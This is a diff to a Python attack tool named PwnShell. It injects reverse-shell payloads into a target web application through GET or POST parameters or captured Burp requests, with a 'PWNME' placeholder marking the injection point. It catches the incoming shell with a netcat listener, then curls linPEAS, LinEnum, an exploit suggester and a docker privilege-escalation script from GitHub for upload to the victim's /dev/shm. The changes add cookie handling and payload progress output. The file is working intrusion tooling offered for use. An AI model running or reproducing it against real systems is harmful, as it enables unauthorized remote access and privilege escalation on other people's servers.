@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 # coding=utf-8
+import sys
 import base64
 import netifaces
 import os
@@ -26,6 +27,7 @@ class PwnShell:
         self.port = args.port
         self.domain = args.url
         self.method = args.method
+        self.cookie = args.cookie
         self.data = args.data
         self.type = args.type
         self.file = args.file
@@ -43,10 +45,11 @@ class PwnShell:
         ######################################################################
 
     def info(self):
-        info = {'[*]LOCAL IP ADDRESS': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL': self.domain, '[*]Method':self.method, '[*]Post Data':self.data,'[*]Payload Type':self.type, '[*]Request file':self.file, '[*]Use nodejs payloads':self.nodejs}
+        info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL': self.domain, '[*]Method':self.method.upper(), '[*]Post Data':self.data,'[*]Payload Type':self.type.upper(), '[*]Request file':self.file, '[*]Use nodejs payloads':self.nodejs}
         for key, value in info.items():
             if value:
                 print(f'{key} : {value}')
+        print("\n")
     ####################################################################################
     ###################################  LINUX #########################################
 
@@ -59,7 +62,8 @@ class PwnShell:
     ###################################  WINDOWS #########################################
 
     def shell_windows(self):
-        pass
+        print("              ##NOT ADDED YET !!")
+        exit_gracefully()
 
     ######################################################################################
     ##########################  CHECK IF IP & PORT IS VALID ############################
@@ -81,7 +85,8 @@ class PwnShell:
 
     def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
         nc = nclib.Netcat(listen=('', self.port))
-        print(f"[*]Got Connection From -> [{self.ip}:{self.port}]")
+        print(f"\n[*]Got Connection From -> [{self.ip}:{self.port}]")
+        print("[*]Payload :",self.current_payload)
         print('[*]Uploading Shell Script to [/dev/shm]...')
         os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o docker-privesc.sh 2>/dev/null')
         time.sleep(3)
@@ -132,11 +137,17 @@ class PwnShell:
     ############################################################################################
     ###################################  SENDING THE PAYLOADS #################################
     def send_payload(self):
+        self.list=[]
+        self.iteration=0
         payloads = PayLoads(self.ip, self.port, self.nodejs).payloads()
+        for payload in payloads:
+            self.list.append(payload)
         if not self.file:
-            for payload in payloads:
-                self.send_request(payload)
-                time.sleep(2)  # Change this ASAP !!!
+                for payload in payloads:
+                    self.iteration += 1
+                    print(f'[*]Trying payload -> [{self.iteration}/{len(self.list)}]', end='\r')
+                    time.sleep(2)  # Change this ASAP !!!
+                    self.send_request(payload)
 
     #########################################################################################
     ###################################  Send The Request #########################################
@@ -151,7 +162,12 @@ class PwnShell:
                        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                        "Upgrade-Insecure-Requests": "1",
                        'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
-            cookies =''
+                
+            self.current_payload = encoded_payload  #For output when getting a shell
+            if self.cookie:
+                cookies = self.cookie
+            else:
+                cookies =None
             if self.method == 'post' or self.method == 'POST':
                 if self.data:
                     data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't change
@@ -159,10 +175,8 @@ class PwnShell:
                 else:
                     data_parsed = None
                     r = requests.post(url, headers=headers, data=data_parsed,cookies=cookies, verify=False)
-                    print("\n[+]Stauts Code ->","["+f'{r.status_code}'+"]")
             else:
-                r = requests.get(url, cookies=cookies, verify=False)
-                print("\n[+]Stauts Code ->","["+f'{r.status_code}'+"]")
+                r = requests.get(url, cookies=cookies, verify=False)                    
 
     ########################################################################################
     ###################################  PARSER BURPREQUEST #################################
@@ -182,12 +196,9 @@ class PwnShell:
                 url = url.replace("PWNME", encoded_payload)
                 post_data = post_data.replace("PWNME", encoded_payload)
                 req = requests.post(url, headers=request, data=post_data, verify=False)
-                print(req.status_code)
-                print(encoded_payload)
             else:
                 url = url.replace("PWNME", encoded_payload)
                 req = requests.get(url, headers=request,verify=False)
-                print("\n[+]Stauts Code ->","["+f'{req.status_code}'+"]")
                 time.sleep(2)
 
     #########################################################################################
